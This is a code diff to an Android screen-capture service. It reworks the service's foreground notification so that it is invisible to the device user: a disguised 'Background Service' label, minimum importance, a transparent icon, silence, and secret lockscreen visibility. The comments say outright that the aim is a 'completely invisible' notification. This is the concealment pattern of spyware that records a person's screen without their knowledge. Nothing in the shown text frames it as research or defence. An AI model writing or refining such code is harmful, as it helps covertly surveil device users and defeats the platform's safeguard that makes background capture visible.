@@ -35,8 +35,13 @@ public class ScreenCaptureService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        createNotificationChannel();
-        Log.d(TAG, "Screen Capture Service created");
+        try {
+            createNotificationChannel();
+            Log.d(TAG, "Screen Capture Service created successfully");
+        } catch (Exception e) {
+            Log.e(TAG, "Error creating Screen Capture Service", e);
+            stopSelf();
+        }
     }
     
     @Override
@@ -75,41 +80,84 @@ public class ScreenCaptureService extends Service {
         Log.d(TAG, "Screen Capture Service destroyed");
     }
     
-    // Create invisible notification channel for Android O and above
+    // Create notification channel for Android O and above
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(
-                    CHANNEL_ID,
-                    "",
-                    NotificationManager.IMPORTANCE_MIN);
-            channel.setDescription("");
-            channel.setSound(null, null);
-            channel.enableVibration(false);
-            channel.enableLights(false);
-            channel.setShowBadge(false);
-            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
-            
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            if (manager != null) {
-                manager.createNotificationChannel(channel);
+            try {
+                // Validate channel ID
+                if (CHANNEL_ID == null || CHANNEL_ID.trim().isEmpty()) {
+                    Log.e(TAG, "Channel ID cannot be null or empty");
+                    return;
+                }
+                
+                NotificationManager manager = getSystemService(NotificationManager.class);
+                if (manager != null) {
+                    // Check if channel already exists
+                    NotificationChannel existingChannel = manager.getNotificationChannel(CHANNEL_ID);
+                    if (existingChannel != null) {
+                        Log.d(TAG, "Screen capture notification channel already exists");
+                        return;
+                    }
+                    
+                    // Create completely silent and invisible channel
+                    NotificationChannel channel = new NotificationChannel(
+                            CHANNEL_ID,
+                            "Background Service", // Generic name
+                            NotificationManager.IMPORTANCE_MIN); // Minimal importance
+                            
+                    channel.setDescription("Background process");
+                    channel.setSound(null, null);
+                    channel.enableVibration(false);
+                    channel.enableLights(false);
+                    channel.setShowBadge(false);
+                    channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
+                    channel.setBypassDnd(false);
+                    channel.setImportance(NotificationManager.IMPORTANCE_MIN);
+                    
+                    manager.createNotificationChannel(channel);
+                    Log.d(TAG, "Screen capture notification channel created successfully");
+                } else {
+                    Log.e(TAG, "NotificationManager is null");
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Error creating notification channel", e);
+                throw e; // Re-throw to be caught in onCreate
             }
         }
     }
     
-    // Create invisible notification for foreground service
+    // Create completely invisible notification for foreground service
     private Notification createNotification() {
+        try {
+            return new NotificationCompat.Builder(this, CHANNEL_ID)
+                    .setContentTitle("Background Process") // Generic title
+                    .setContentText("Running") // Generic text
+                    .setSmallIcon(R.drawable.ic_transparent) // Custom transparent icon
+                    .setPriority(NotificationCompat.PRIORITY_MIN) // Minimum priority
+                    .setOngoing(true)
+                    .setAutoCancel(false)
+                    .setShowWhen(false)
+                    .setSound(null)
+                    .setVibrate(null)
+                    .setCategory(NotificationCompat.CATEGORY_SERVICE)
+                    .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Hide from lock screen
+                    .setSilent(true) // Make completely silent
+                    .setColorized(false)
+                    .setLocalOnly(true)
+                    .build();
+        } catch (Exception e) {
+            Log.e(TAG, "Error creating notification", e);
+            return createFallbackNotification();
+        }
+    }
+    
+    private Notification createFallbackNotification() {
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("")
-                .setContentText("")
-                .setSmallIcon(android.R.color.transparent)
+                .setContentTitle("Background")
+                .setContentText("Process")
+                .setSmallIcon(R.drawable.ic_transparent)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
-                .setOngoing(false)
-                .setAutoCancel(true)
-                .setShowWhen(false)
-                .setSound(null)
-                .setVibrate(null)
-                .setLights(0, 0, 0)
-                .setCategory(NotificationCompat.CATEGORY_SERVICE)
+                .setSilent(true)
                 .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                 .build();
     }
